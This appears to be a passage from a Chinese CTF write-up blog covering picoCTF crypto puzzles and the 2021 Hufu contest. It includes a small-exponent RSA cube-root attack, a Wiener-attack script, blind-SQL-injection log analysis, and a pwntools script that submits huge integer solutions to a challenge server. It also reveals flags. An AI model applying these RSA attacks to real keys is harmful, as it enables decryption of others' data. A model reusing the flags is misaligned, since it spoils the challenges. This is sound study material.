18031488536864379496089550017272599246134435121343229164236671388038630752847645738968455413067773166115234039247540029174331743781203512108626594601293283737392240326020888417252388602914051828980913478927759934805755030493894728974208520271926698905550119698686762813722190657005740866343113838228101687566611695952746931293926696289378849403873881699852860519784750763227733530168282209363348322874740823803639617797763626570478847423136936562441423318948695084910283653593619962163665200322516949205854709192890808315604698217238383629613355109164122397545332736734824591444665706810731112586202816816647839648399e : 65537n : 23952937352643527451379227516428377705004894508566304313177880191662177061878993798938496818120987817049538365206671401938265663712351239785237507341311858383628932183083145614696585411921662992078376103990806989257289472590902167457302888198293135333083734504191910953238278860923153746261500759411620299864395158783509535039259714359526738924736952759753503357614939203434092075676169179112452620687731670534906069845965633455748606649062394293289967059348143206600765820021392608270528856238306849191113241355842396325210132358046616312901337987464473799040762271876389031455051640937681745409057246190498795697239##### PRODUCE THE FOLLOWING ####plaintextIS THIS POSSIBLE and FEASIBLE? (Y&#x2F;N):y#### TIME TO SHOW ME WHAT YOU GOT! ###plaintext: picoCTF&#123;wA8_th4t$_ill3aGal..ode01e4bb&#125;That&#39;s not an int! Exiting\nTapping\n\n[Tapping](Theres tapping coming in from the wires. What’s it saying nc jupiter.challenges.picoctf.org 28927.)\n\nWhat kind of encoding uses dashes and dots?The flag is in the format PICOCTF{}\n\n\n摩斯电码解密。\nMr-Worldwide\n\n[Mr-Worldwide](A musician left us a message. What’s it mean?)\n\n坐标，百度可查找经纬度，提取城市首字母得flag.\nFlags\n\n[Flags](What do the flags mean?)\n\nThe flag is in the format PICOCTF{}\n\n\n简单的替换密码，百度找到对应网站和图片即可。https://en.wikipedia.org/wiki/International_maritime_signal_flags\nwaves over lambda\n\n[waves over lambda](We made a lot of substitutions to encrypt this. Can you decrypt it? Connect with nc jupiter.challenges.picoctf.org 1981.)\n\nFlag is not in the usual flag format\n\n\n同为词频分析，观察后猜测jgsk=flag，丢进在线网站求解得flag.\nminiRSA\n\nminiRSA\n\nRSA tutorial;How could having too small an e affect the security of this 2048 bit key?Make sure you don’t lose precision, the numbers are pretty big (besides the e value)\n\n\nfrom Crypto.Util.number import *import gmpy2N&#x3D;29331922499794985782735976045591164936683059380558950386560160105740343201513369939006307531165922708949619162698623675349030430859547825708994708321803705309459438099340427770580064400911431856656901982789948285309956111848686906152664473350940486507451771223435835260168971210087470894448460745593956840586530527915802541450092946574694809584880896601317519794442862977471129319781313161842056501715040555964011899589002863730868679527184420789010551475067862907739054966183120621407246398518098981106431219207697870293412176440482900183550467375190239898455201170831410460483829448603477361305838743852756938687673e&#x3D;3c&#x3D;2205316413931134031074603746928247799030155221252519872650080519263755075355825243327515211479747536697517688468095325517209911688684309894900992899707504087647575997847717180766377832435022794675332132906451858990782325436498952049751141 m &#x3D; int(gmpy2.iroot(c, e)[0])print(long_to_bytes(m))print(m)#b&#39;picoCTF&#123;n33d_a_lArg3r_e_d0cd6eae&#125;&#39;#13016382529449106065894479374027604750406953699090365388203722801043052339225981\nb00tl3gRSA2\n\n[b00tl3gRSA2](In RSA d is a lot bigger than e, why don’t we use d to encrypt instead of e? Connect with nc jupiter.challenges.picoctf.org 42900.)\n\nWhat is e generally?\n\n\nnc后发现e很大，维纳攻击脚本：\nimport  RSAwienerHackerc&#x3D;67725484828660171155495211630497256983804750771405173604915475315285337259554745019946599487641055680169265457644340938264529723371169972500050850583888499676593738216542714158045211992126456724042909731789545505279795504523037528761238149430515678580782074452909931229053012113137701929175885390372056497999n&#x3D;92908556262738254094065441172814586106067369443369499189214986491976931561738844273516700957530563178532708425726354645373760924007923816005398578319882528611540185427918571906094044173194388663365364134997826444445816336765012006409280712402476371185929572990909183399977560298360727962550970347800300222711e&#x3D;69520159460585947518483836148643582831918423640590763549444035011978832519891224565191960240113848478143117452571748866357688968863765140502139873387990270685914837356707507222866135679527601234329281217279226396840073020368275802208410100769859080342284164663788369069928003055037897805163984210272130270657d &#x3D;  RSAwienerHacker.hack_RSA(e,n)if d:    print(d)#import hashlibimport binascii#flag &#x3D;hashlib.md5(hex(d)).hexdigest()#print flagm&#x3D;pow(c,d,n)print(hex(m))\n十六进制转字符串后得明文。\njohn_pollard\n\n[john_pollard](Sometimes RSA certificates are breakable)\n\nThe flag is in the format picoCTF{p,q};Try swapping p and q if it does not work\n\n\n","tags":["challenge"]},{"title":"虎符","url":"/2021/04/03/%E8%99%8E%E7%AC%A6/","content":"2021数字中国创新大赛虎符网络安全赛道\n\n你会日志分析吗\n\n线索只有一份access.log，你能从中分析到什么？\n\n观察到线索为盲注内容，\n通过观察注入语句遍历库和表的过程，发现不同之处在于针对不同字符编码，返回的长度不同\n\n通过拼接得到\nweb1flllag,userflag ZmxhZ3tZb3VfYXJlX3NvX2dyZWF0eQ== #flag&#123;You_are_so_greaty\n提交flag：\nflag{You_are_so_great}\ncubic\n\nPlease give me 6 pairs of positive integers (x,y,z) satisfying the equation x/(y+z) + y/(z+x) + z/(x+y) = 6 nc 8.140.152.226 27359\n\n根据https://mlzeng.com/an-interesting-equation.html理解算法意思。对等式进行化简后更改脚本，从而得到几组基底\nfrom fractions import Fraction as Fracfrom math import gcd#n &#x3D; 500for x in range(-100,100):    for y in range(-100,100):        for z in range(-100,100):            if gcd(x, gcd(y, z)) &#x3D;&#x3D; 1:                if x**3 + y**3 + z**3 - 5 * x**2 * (y + z) - 5 * y**2 * (z + x) - 5 * z**2 * (x + y) - 9 * x * y * z &#x3D;&#x3D; 0:                    print((x, y, z))#(-23, -7, 3)(-8, -7, 5)(-7, -23, 3)(-7, -8, 5)(-5, 7, 8)(-5, 8, 7)(-3, 7, 23)(-3, 23, 7)(-1, -1, 1)(-1, 0, 1)(-1, 1, 0)(-1, 1, 1)(0, -1, 1)(1, -1, 0)(1, -1, 1)(7, -5, 8)(7, -3, 23)(8, -5, 7)(23, -3, 7)\n去掉冗余后留下两组分别为(-23, -7, 3)(-8, -7, 5)找到文章https://www.quora.com/How-do-you-find-the-positive-integer-solutions-to-frac-x-y+z-±frac-y-z+x-±frac-z-x+y-4，根据评论得到解决类似问题x/(y+z) + y/(z+x) + z/(x+y) = 4，的脚本和网站http://magma.maths.usyd.edu.au/calc/针对本题目更改脚本\n&#x2F;&#x2F; &#x2F;&#x2F; For my colleagues in Shell with a lot of love,  (and  with a lot of time now since no commuting, cause COVID) &#x2F;&#x2F; Code is commented to explain how to solve the meme  (https:&#x2F;&#x2F;preview.redd.it&#x2F;p92108lekoq11.jpg?width&#x3D;367&amp;format&#x3D;pjpg&amp;auto&#x3D;webp&amp;s&#x3D;e0c84917c3d7e130cad06f9ab5a85634b0c88cfb) &#x2F;&#x2F; &#x2F;&#x2F; x&#x2F;(y+z) + y&#x2F;(x+z) + z&#x2F;(x+y) &#x3D; 4 &#x2F;&#x2F; &#x2F;&#x2F; This is the smallest solution: &#x2F;&#x2F; x&#x3D;4373612677928697257861252602371390152816537558161613618621437993378423467772036 &#x2F;&#x2F; y&#x3D;36875131794129999827197811565225474825492979968971970996283137471637224634055579 &#x2F;&#x2F; z&#x3D;154476802108746166441951315019919837485664325669565431700026634898253202035277999 &#x2F;&#x2F; &#x2F;&#x2F; Paste in the site below to execute this code see this result, also read the comments here to understand.  &#x2F;&#x2F; The last part of the prints() after executed shows you the solution above. &#x2F;&#x2F; http:&#x2F;&#x2F;magma.maths.usyd.edu.au&#x2F;calc&#x2F; &#x2F;&#x2F; Eduardo Ruiz Duarte  &#x2F;&#x2F; toorandom@gmail.com &#x2F;&#x2F;   &#x2F;&#x2F; First we define our environment for our &quot;problem&quot;  R&lt;x,y,z&gt; :&#x3D; RationalFunctionField(Rationals(),3);  problem :&#x3D; ((x&#x2F;(y+z) + y&#x2F;(x+z) + z&#x2F;(x+y)) - 6) ; Evaluate(problem,[-23, -7, 3]);  problem*Denominator(problem); P2&lt;x,y,z&gt; :&#x3D; ProjectiveSpace(Rationals(),2); C :&#x3D; Curve(P2,x^3 - 5*x^2*y - 5*x^2*z - 5*x*y^2 - 9*x*y*z - 5*x*z^2 + y^3 - 5*y^2*z - 5*y*z^2 + z^3);  Pt :&#x3D; C![-23, -7, 3];  E,f :&#x3D; EllipticCurve(C);  g :&#x3D; f^-1;  for n:&#x3D; 1 to 100 do      nPt_inE:&#x3D;n*f(Pt);     nPt_inC:&#x3D;g(nPt_inE);      X :&#x3D; Numerator(nPt_inC[1]);     Y :&#x3D; Numerator(nPt_inC[2]);     Z :&#x3D; Denominator(nPt_inC[1]);  &#x2F;&#x2F; printf &quot;X&#x3D;%o\\nY&#x3D;%o\\nZ&#x3D;%o\\n&quot;,X,Y,Z;    if ((X gt 0) and (Y gt 0)) then        printf &quot;Z&#x3D;%o\\n&quot;,Z;         printf(&quot;GOT IT!!! x&#x3D;apple, y&#x3D;banana, z&#x3D;pineapple, check the above solution\\n&quot;);              &#x2F;&#x2F; break;   else       &#x2F;&#x2F; printf &quot;Nee, some coordinate was negative above, I keep in the loop\\n\\n&quot;;   end if;  end for;    if Evaluate(problem, [X,Y,Z]) eq 0 then     printf &quot;I evaluated the point to the original problem and yes, it worked!\\n&quot;; else      printf &quot;Mmm this cannot happen!\\n&quot;; end if;\n其次，有无网站对于输出有篇幅限制，想到可以通过逐次取出X,Y,Z来实现目的。\n再者，由于问题要求输入六组正整数，同时不存在倍数等关联关系，便通过更改基底(-8, -7, 5)来实现。\n从而得到了六组数据，进行数据处理后，手动输入时总有报错。最终想到交互脚本\nfrom pwn import *p &#x3D; remote(&quot;8.140.152.226&quot;,27359)print(p)p.sendlineafter(&#39;[&gt;] x:&#39;,&#39;1218343242702905855792264237868803223073090298310121297526752830558323845503910071851999217959704024280699759290559009162035102974023&#39;)p.sendlineafter(&#39;[&gt;] y:&#39;,&#39;2250324022012683866886426461942494811141200084921223218461967377588564477616220767789632257358521952443049813799712386367623925971447&#39;)p.sendlineafter(&#39;[&gt;] z:&#39;,&#39;20260869859883222379931520298326390700152988332214525711323500132179943287700005601210288797153868533207131302477269470450828233936557&#39;)p.sendlineafter(&#39;[&gt;] x:&#39;,&#39;4797638216628812583434025577605647593302822112134074408304197287542626731655254754760070250069695806237478221185866750975864984886647923024950735389831823373908555291180424415780024231454429163667332563396190904475120830158622717917403410286269955215566928195911908452819781909832541473650205273220866668169706085422281346283683985976540910523295176188150172920324239409299506597321070979467526996274250455453182014342144936200082194972917287973666427586488695999171979538251246523201245515757129525859568862236578547077946470570834236704528174230986916804096494749486164989791799546021425641303587706015640912093764433943754791135952478302825539395135192814380102119660006534266801158156700532041924855632560802425763479310909232427688759422464721428542139255036982495633027474766492231096582800300651532249452886124953384853644678030788868746890039385094652563276776070355819550156592854511474008067006161138536377052747705010046805434254128197439636732559891068359224512685476617566910615703158046476554017740927198988625166011702932143115961764294294133907713303321841125624206851854472613188228173370133650483279735267719807509520708582676901775464380300759372054841808969769362891985102581373&#39;)p.sendlineafter(&#39;[&gt;] y:&#39;,&#39;777215626371575217088310657140916521552988153647866038173198916020312203493964892557563515431776969976046377584808229726352107619185583316687354759898196737347993746254565122120527731768195400231056815663888758684421038238709788019326884485614991925753966183761708679471125148868876403664908848861229717592196841841920473123578320855383118815350240637368544307701771717790650586054632461552124823315180571553580552049469926518181331572822074022199558952119404190298735931653490892364073367374730596017190552617978971456481522903772154415790713998943890853561688541203855503519300220331450635692743853335580941406696263179637852488484574223656341703333725590156162934937022942328843104826018387806660541029784540066112095628410607646582758361692137157069659886753575805335098000015351084698040967634958962458780606944874861680995183423604699064295119192178585506522888929055816009012760980227645872065982724034169776145752311726352982276547920221698579169084852770861432795991389945366645278302963590215158406022987607104254724775954509771611804278473641470084216432339586431642635279556427721823661252622577913436058122095186869865354722446845980909445583248603818646384918432817277751662114543767&#39;)p.sendlineafter(&#39;[&gt;] z:&#39;,&#39;45515177015370523186598470590800680389544668323346594120846310192651398948390333283841532838684228638057215529362980007901386037256606243099615016102478164356558671683211294326446538751067821841673990056500943490188667311094600394287944059737699170342758141308528120872594274846008499540806901157295755540786515739853811429101516388477908520360561007082314632823114318657321995023547907820030487984940570143033969059826198120222159054657757563990715876115982516007694588913589122694187210686371983934230131835116521724432838149089565766042842475792610165897246048263301498788205247949191959658551589000568833072395086346175560101459095869177540490444202757299358218286450933222931993542746092845434882841955167085611634798474215124723297956721787207069367210409930468551846723224409896901058733139606912810756783041961963236587262871957343659125846761987066927612211879278746707077150609197098785704768347642644777952301121081864034466935022811337948250337129064542497021903422439329618855883674545481251106939380976621498278402398166702566979987748149240552204768106633906852518721918670969297060120387704062182294525438430153827499412674831704727795905692842778950482616128311989966416414551687&#39;)p.sendlineafter(&#39;[&gt;] x:&#39;,&#39;314292671062173921111292961964938688436708560003041812060682883475601482731858816422240383882944462620623567286587503750889103725755740006155575297673642764299712726683321335389717791541964719934510825511641995918205107276454661741769794334108514203164641911236712095598112837257748637990075283636106682003276751427529201991787105193934697041232800134525851852447109810170418723631301828242625191639180887760900486283796646822636577982415485834912490056678350793904299469556675190381984269650656661389359603438215672023664789997298532577361391479552727060752508401019647303083662666278442587228978720394609332929193655411546120631186405265728554188782640067849098497720941130508081137596382759145482661677081314713162009647103220488302296025402048431671351592354184472261402188368030157633491138250760&#39;)p.sendlineafter(&#39;[&gt;] y:&#39;,&#39;2370844050733763168653056912182275089135481091989469895123144001232602797883560999259129655883146226759407799774039653583687248933666821013837626069498685816554714705323847460507235277382794614936098961850448835901703891332533224965178208112684042141294337624561114056386810429548483148842597664557193452726536721058295707545479924443144714770275921157720051829171825732745857876583623371634787429544606363093272415125412836762819303421993587964400942215536942030583066797232871335393211395326041484926097986775013694902283133471846514714506451260645208477576233622738192899871671383782415144282058906877965816336875417759881658992236986398952428086504437441217917041059825839022060700048544901256390446316992733932612136873399094430223469630954259137165426566293784012450269989381719756996048058089023&#39;)p.sendlineafter(&#39;[&gt;] z:&#39;,&#39;91799790641290895978892693045989377201208936340103016031364426490498736597677568287986160691579377724785392328266339231530225121046175630599728096521939605350739358168216330513241983978233993998988991326492874516049720675702286872816333914372511669802712219058719713832528597339293054368816739355907136102655521941992018553301928493452434474447723992660186680549103802498214282230740469986200770650120969911569599029786866103349814407040007149745644301920170584323025348517461308692357116926947251792699428368596979150563731309323515129474727817938633113832298119162778959620065753052386380251973187273607723986357950763286173562416762837143991547957533832926711542607034850457520418701875848727202883029106928219366050792422975016449024940528092641753838563742427509959090708910325398150439211810947&#39;)p.sendlineafter(&#39;[&gt;] x:&#39;,&#39;56343649470240944554541894194988032703152997483478025833485972092218241337348853462230550424269147587800007652800293442004563869063886539040704766619498961200516659583290762006742798747469819888357792304697529942283359016185536952419123443659813889544074213427237110287294366175059635489448606250819908358350367149475716496147487553433179157998593945045322448076446074865941920944926999884940332993017456395924976676018690218339595481948243896485907414278966492530683292887139539659213655023566766221831101135716001114169465582095106866429598465819579251295344339363122366559695834860866804821549078214470097325475562348355909825383578656299291495158122343583669460994581463652874145227290461773333377653825221448498643097415855394586840976390778065228010016838569596510884166894677724088453570554767891184009131202317463514667359675678308273163019864696397081276413389405178171832745064861375814617936899532879712697136502243767035869937886475349752732150896969705296958490386441876956461184753084885769489430408516478703269437168381789319788790797428959139328712339957316117433448921132629622916708162428803235294590729639690852735377737206875338559199642070756311221226354944275318104837238167938202874217277492682815157499036987671256790859209806061503081344974789146778142931461324438529830704647215310927456378226982094776791700899499767462440654000563331840801303630438288044726721668704136674569839611669539413577512641649460977325998156570611386695018346162124146444706600987125728699130857055733537679469412242428826826935313006521770416368190687794280098116223642593388696849325370974810173125463698206913626766831972902243040465791015306424858355284719345366417620405511681504199911683347113281944681912916616132595054141026620258530563782786876322816587301269197442746292368414303315916127317539282360592306966359033242684651591954067524673199807562267732882499063271347318982611006661263494424151752264285558404799539621054955240512368945118792096497578940815581860912677444713933006832661623582500082478103238386417759689596063674005645479325332513077947113142956489547967180110415807786757407565752981932876353479407753092629266170282399179455720412484028739177077916224898883055016568193570916954087403947022375704897561290704151306304296686231291915246078164894587604716731470270119255087638182016103482577417893994049532855443300933728751399104111113609139228244726117959809105870149939972243213243831080813292338018302734542541233393743764759099980125399064644064805556447102406684434751204627691119565714724372329434706830140754634784227958640480013090696910905948933204602786185318660439519844302686975950999911055368&#39;)p.sendlineafter(&#39;[&gt;] y:&#39;,&#39;690513437917728358762742711882624210164156431191697460882071057631561434325917194724772571514769724756242649519293158098384452412034167432275066372007004613680327427275255271007127044500195055860576563483804846123615529706820098453919546485591052753586754752104074341574860615520024377668700069864523352595220021568265975747313365897344377455241983028423674873434480056500630547147021993841999914561066320454849616376511661854175124523626563946260328304964816820133526615504321061413552393435413734557860662179798338474456125557653019597413139361818201425365606459576981822303550670526711519547509422125776104848095712289913400348586094384034058327925810664271557067622049162165150997202607282520298373725742249437300215040007286145644594199573242191594020014861450701927255018742772391559888966053022348102555531053982964052676926034925187305081627180507684742157711204353955162518874918886441532355751364121120137220061598963972580632838065901252190541351505027162785606878378311773952864869040509371374045692153472360339820677197672974756063513992872813455047100440244265557323434292412653818727791484111886782630394009644619539997443752988480521672135682157981673252052742864017573864197821230865482608845995740938202946251972964115016855530942129284157345912242376589154358871801279188464112607201835735932165284481904436829641195268567905891766429473254156084489952125398195272913330657462922772676499577099055343169854441886913994787834086606951740959589308664147443162319475581543409481990727383462831564419330728082071773330584289890411190010801069814088316007675323856714135491996452097141166559416692817286741598938662142626353838913514868198944005794534159292904121493082022746192498136043686361054539803627017608616650817531026636848049654514828317231299512550948146410251443374282125060797517096613206515282939712390801471584022666792246977896986312650918250296670922360409243340310820180832046145279752237926888410158387477570151262836436709586347996373290744918424123874672100019158042610343734330300670999884700852984443231339851004224214797726388873060011777955177645327156497832413161629291650080831223335503202990794458074506899395173451753753412917542092805390442383785492313389266374623965592621164471788912979915288373531140420679741585514338378160814121102804719457924307258255604149561680677196943968021781539349025029439498318908711409131556014964860313682882585682350466634173408107287337651166402486894914050092552773350939774830857074355792728576489985768113131291720474480791442839751564508645608156726138081315247369269982278615147021753411529822207492155763831635572814845385765795018138222502796671315249755&#39;)p.sendlineafter(&#39;[&gt;] z:&#39;,&#39;61848417055152133095432859376247872928009845246789580178050067454174942407289297559012928374669880399226235006088231916429036431717949140079523107699010796967464678696750432063224742137856002145403334654222909904962522076144363242043530182229726617880261101644639444540632138844359849325627444234093053497298089172796831309295203428323237607544929109304950196414277510671931861834789019508453957863965179460523547130977182721873412236354976041295946290574129654540505955820992215494161856824568912319386270787992756116866062781660041872686867599926093955236454271756037813904065345815807967197252149709256958910903921629063676085365164156292505994515780099836726603025001546701580563990270117723417757806315543027481605046648706694155341556749747961645150448309646644003429504745612139087577369112753968247750887383888853833638024926592320525431539002011906512566022225505488290067553775739475228974287524010911471199580446981297499033324293433054314997340507624763508479764288445959167109818379093312384897235514453806773570506136147460374739652208927635094780369233426741106222197305283621020742649692897738775130354778510804617375762614331484058562161679108584863456408377372390011016005774582862355690168291837260954433736953414457935193344330564117264151893117400699445297640650235267828893304134297349172279303352447772969171487962668842312818473409530277128527703784927802500713063308105794763395798900921132178185481565958439843343194891889939209386168195922077305571738816941145556666482431762119631038188209848264753064527691896274230406206976712407517112707473610456245413512449975006013001346800249527889328831154098431736999515648890302395574277947121160024065442038436332583230900633713649991890809933852937500538580995409391470251506811498781070869446698178060432825438142270059298820983291636082393750640274537182390720017567223171631951340485128381886918925746013563999355762098143500142836828449729756344834461718923526113135739367355419001961839441783370438433332524888952755072832867039562229899392173573353580606101453996017971785110492890103233518666006654441091010777306628401192942553802480194127241303493562250604973075784009007771841370274177808149418825652458156856491836062709242993030265020629565270893072372766252475123700999649400333603526094308829005361507091842135532356536463266979832102425199482313385944078782745555471266946905886911818229551468226593701687145021166521176732270133153258708133382809042442578592219243168751249134837347002782547031127475927820490325693389499997710379922677662230692761811590207110600097677071251835260867376130783566079991453152581322156882263817629990605055912556595367&#39;)p.sendlineafter(&#39;[&gt;] x:&#39;,&#39;1466462768803722687820990234146153789332776717426574735157342721894173457313793945470995397948053356427400255798986824549142533735653243872935065667283473357648161546021360813391606407358422258488463177267190947790720880067935702278652903629428101039967610738736032763360537325988503316046992497815420149392442185456639217773851126536800303404704906357832735069464476881204164101005831350899734876576455658842071540866658496429523694053741747003274745426660915410875732910009698770028863061692356650150359274502417470145616022187365568348366183555284622003617047953676123255503879408662958850277914455813142457580910929063291960692431164975973248697909727624630170385090818255406971227365813586689855062427882902087409590194133583325138182803031874353720239525341257976991453293716238702606049904809975311181873847202175360574473960210635030683203341524371158272359543342768002682704641639270023106995528115967954614158263176608889238834414979150085710345552582864875273548395511761063104901679126625884770540130127110239251299540382151889587418636217401856273223406736777664731035692208401129541554620276534658936718978867906083660273888852478360656326426348522516050204325765871127922081918524356839561452544240429557671771864300929161623099693525813299169216533966160346052929994327173984258914667358101930622397308183483169850178838924492639185315152609906814955625570811896455006089818390842937336733582587268722512443517634955373752922508533706884558197023941312207821484164116313449042275176450912610267367732036322555879448303078575205784751453502321946890278764349534090837614791907838419293287099943865406547170516726740489446964722410012036556555967932070416519239143966546404023416713865455161926722765793360471879496500828503958488051251210726713698214036252726752887957811379704663037356850400162151317113751028454602541090788271606572708984000539082815639064834898766224260385368930121264466445836747484008130156009288880610457237625764045317543690301274901058450254654602263017522754533808571561150814949056906961341511996779937354884772320065821114957269363368274611297708624271519660854512441426885509896350237251805939970778259430889678574006608136753859840404142026342231687427902144318243382084429667896923184193252430887056592702444454022137403893487669767665660351005504950274132704290455943998846427235946141347169553800927911924353286398496376968565099634844332056371355229384578221800076164170621512726157130214356899574789759718093195135118082774844180281307499695648887081926310963073570400373003906368126732440450380955150116087231718144964332207835674227278000056751337448599567089441718938335281958743765482365111100590619039742235511041300262432959498787424523918512869059510706240190996480183464879967572100198195167462376952422143853314955176499760574685656362642914482179486020613952169810456578542701726428005358201809943863225873729123643314878509035476900560473259425980335521841579400065671829722273467335279301109077753627723421347620528598516236564749222948406616013333981919830915003458200779586548274337503547102219676918439442144257263573807272155202623003956313441230268083475982624622859546209500721900192050944311765428240869308787726176692926966020956918895007303095260780322248180161257398502980490226033599320769833471972587073463713330851274204567915760444570046332183071746896173290833314571417453631617049654276903115010145030258664163945359454008944575669041922816925525989390345270907544737781268862270002859816424663306327644213071450917624028760639368439510039391179322408733786094474873541571068690093479803341479746458972459944518289705044943429687199015131659642424704585268483234784277200350564944835502249696934078614051140763153047275086153077133831386679260343859202464542254145393519032481125509033066968402752476506859283886797956989432400654527254724804539151017004378989227091548671276650109132082892293473239439873288210616004718137202001522782415787670607477172980776641975376907824813740753900858881163073009973675497411327475759484661994433541027118478477873203801285348520794633328592657263505999991128879668520585720428622237742490512537950359402205324001995495074505807089644668448393383213154048818981685410508280672403006942175254143340620979643541341540074337572659622703360744479191758526561879748065269225331493156319797202196698953093091118268663180285453994173175004765042540875901896560172126805963396790075724648861284061587949206539942962129412131995287496570144629907257102335817747474586134616799127347111891708334557715358473749128447523960311368632111187524169171349903681252047364790356294740543040289664587755687750107722774759862119191799852175001489149275860198133527599004010589703785960337252846734341350955273111125113685791268561493953580889137093318460379114925753926139452652678469214058672198208237080575292099030434720230371019151930821777059596403590137514162396944094077882663593602532834157681855429204563684714007140790471341731865660059139398388366172399274776878238470590564900337146592840055286970658590626056064774635037184621116150135854418956354510228350086920816992573510920569142525094101331103865716360093037599947187352903338592828664415300111098987525354000528988539370713205032546695346298781626827639615547289652649948996485550687407583089787140208368014043142638420083431583735065909488869448639307088567210131319590284847238355714331037717182304377120888237618040993668130877092086293688186390937832034765693427660886462975244457222485897333426083174195975863029051784841114606257147096809874368016484207233438338509864968&#39;)p.sendlineafter(&#39;[&gt;] y:&#39;,&#39;47622450400948378838383772282463774606862475585470916135643120242889164588999536917143252778898237971519642050232275519904346077796804164997665170205968559976309128127925359988920951940206912919554809735600309714561600669180191562523906954373442895286177820090074271444866144401506681728848985841518809813817744245369156604056715252134781651290696247931418719827721409603298669191348612295024182755007100463679890698670970772218604919944523548556339943990850928329334044482351470144751278631230052483209229192136090007700973362792766305057772210218843096395204004481827871813127982371104261927151640854476471691258603962738116589877882203513684178221638481443997120721426951288321845195709538874283311496775212472633043757016949413544955089450529970071115171319204455757146236186283669069688840344104909843453532933741359090255143237887602089268418356097385230465055288442812353852678109364557896410605519305061329809194582847670449343808895801066484058241857852557025853970470346734297512391305668724507609507860997210910249828839975095498003479392729012450557551501558320236220920957164255349717391566888082337651296824625293758028502677596286857109601061747560818473556222963976245224436029590094669629286031110344430825748468172810347309875610823148486669786946210224096523266839596074611763758157557664013300435818412520127102295208939189906585620396212651765699761291878071263904189401224066323142807351350771288944210158279686921742294747307474233600865491069252006522535488189377697928025125557621379549255290434908346038130268791214288761888173148344653009237658149639465258186543795913644724483967167271354216410857782569840456443439191163524988860419550058863439011112647571765143098332645498985654541702199457567021375604151698069751565059399207164022611522991554954322337382634649727285217129423673370394965121067239894366149581109228445711919745882281342614646173496777927189158828873291373360559493626235980310503651954583446014359765608056405680697149732429212383292427158489912859600560764546409487137797434433280391746835155157023613387021771257903833401416657254712158341427482279548188517245020827649635343698774804958039887874677668293792752410148798450853470012738072908329266410979821696916469513375891863148739598334904827404460820947224418582238623488603934818365623881078631861542509103895074183496885978299923729454828974760861965227627240219823926287218746031610309230743922733682874795150985436217330699586340400912320670388975069961195118990128872085568496625327692693432900622868904887568511422015928091397130006637366088807249451579584296668364743256869381706306860780375897099571626209545626485944716947896464577148689231222737379171911134294203436527612713553746799327282889817221830528744366228624963184335138436843991411220561872387514837317617725088051768758821799717134972056130662827963575852075195983333237812361469358928050372207865758118382197475583604897923869874443254558509491089094497114309187515435417626768692338314768879199254962134071364892503433291512653074139512155522589222479395052657948150741190520214628284891464936780162688434679291410736556884486773696840381406282032875195723530086887753071363641544299638554503482403044827489580056913943422699970704859738311408892499707908489253243553716995417910394398094100749297597547580211158200206330030361004088378215696877933199873683522779889198901930937215425097187656672830486004822490294320139664485427561504232130257623519683347400842087756573452879355666822274541394819212535164620698017642540024964879529442496467620788094786440378476823695293501722495338784621644962662327864386529025226531680747525116663651083867870952664381887535020135683653867535500764985777586994135175757313800702085306105423536196873700543907429173383740071355554433235790028028913063521657396875545515280730719253230768312689362173644652095812428829060569326084255919425957186992895406713009973532453651237396275339660722984857993571948014177882269245678789940694598886067003485062545812158114223243596985982981053929849377362932912968592983160821938296512313053406706366570551134248607106838991076299811097232369731983873397568183604741730679477708228043724274236971655276883587537538807463933248573056764890328937147993552897863908422809744532916448505130307316345603250021629200966979727553566898848418212050469040462774067434279504303064273954443870971451129233529449800530988407135418019143122293348275498630841723639872063348515200353880053898537816522858218623188622751826735048654693126489566783502051135681427010709684649132264136843643574234222127181277585421920287397212371635900068620872015237701184536167275969863375956410621166928239826276150733735560005835242757705026050498056686664492317443869890115549535953605656840319187701634496815261905403829900411155129186253431300704606916547191143757850974622268610491295742185729093409192567569751484195005154100683306654779007665669728792963209833514009497910233070844858781637129847244418735700272643945288880602248591506142020110809954124229243650347853949950615679125504309603268168970087780082752748418531873061421099344561758754414122646701643857380924441570725935144434391134626028509815913280036817355699592050233801080040353249527134723579200097042105263761350123881231422906878938655350539034665984543299464199719993288263333879987368133210745062241607017400289127218733968733124756652452939417370203706536373812620169103207477941223978551834048584046637279693226304436911401963976815152363999340062727737206096822311985120175950512924402251872044716022462706876189642892600376531572498967&#39;)p.sendlineafter(&#39;[&gt;] z:&#39;,&#39;66927300962594526433691049606274556304862158623996716267325116510804817259141180433319624819498872467016164983561661814636049267877046537299965248759441664642598345133417051598403176798082615204845283693035656872570649078336287227067368902179642244222239984523346678772042690304361249865353683850342179580502147580080757053402446126773999609202324322709362462676134328136609903665672280797508078900660796112663673468641605116282262899097309400746891530018027750466661790526329810306146141695693914520677585164552216474840309995547064611237918070546709377222165272378314068384793775457668452009306048348895128995002988902794636932921234927223329647662939206124624828323469065793568531657191357186147574140770128065068918041448577238039076760326896427869528457099909539325493630992772023764558664033435116360960903751352240563599901623089344937055717318171612040220640827766834156252889073351282274822101473599461991875969156173991274578906197315512456625735444804343035628800597633715107619279158959068161547412174747570120379483330524509484760747796925685249469032493155588612213383453337077575065585962521706260333479825086605295957271545562149621335156126110162366126473705638033363712774741221836753263217758883765880196491869410504570933305743060069860975055649128507479441958810195549472025050400528045983753847398189303413545785339863228950863768587074633920093161200302501267125260175868282706493047487168581282076666376634636167634414710781401393971653985830827927007309169465226093083478044970927887972886557429830634012879296576589760227319098983186169315577517393914192996321400751773455627776071728913342273633241718182534386281935236353596388301240842069405071567486900071739061583329111984799312176125713321752282854247257886189324411233120568415586811710440315346897297246916929123598878666679308835718038978117679703023356142198235832125309463309604256301707598805751405259806559128644085610702712812562354419159921730782828327515226175309134573323595069984014557701701485072235713728149598452237499462503918214734379231704198368296295733890653598753957359695587970825343863366700041715041233982601189066574306209059234424975439120916236944596654065338512955855777168314117791171266456229310466139343994250978650715515626073524599256328473769339607965353248375986876287126550071214269041181929452653337669050739148394872668259520611458863141057002645808926592148325017566321752563292394829599355906238644007844188431820772173341931771976968375942113084836410103378029085408078113088814921693211378823076837124332974990079467811160613204587057215601253608420614864288501658017129579795953592467287764306392459396367389483747616589540618262096910519209577970674342180545726817391824711332805233705528852676885277261271351342703308527013485840331185141423823361164073990080759968609824735105303460223612303171728400575786860011632102743299745951262861872690140264337994411213868832313819843062148400149357090840772225047219733352226685278088555596109907114881088991075129571413814207329165655008969204781344827429638616475244687233172021051771220475891639637769039701834916437120788397531271697214196568021200344792756323378079245446144981102403631884870685946796507212902278770548585581112526855002964702426706841348912586214486091382677371827630324694236911287481925859913391500827740985560157185050174313521180783226198706899910141150317417112907694960890149778805702632664056904419117037813969069987629635876129996412901852500728691704409980759536923426714874607091939560459719693563262090709056237846881234120574993590440568267547284478501243476483987105502181541169525781962335138787982520598226386563285446355829563355842318881743749414556749021510971072168544184878733716687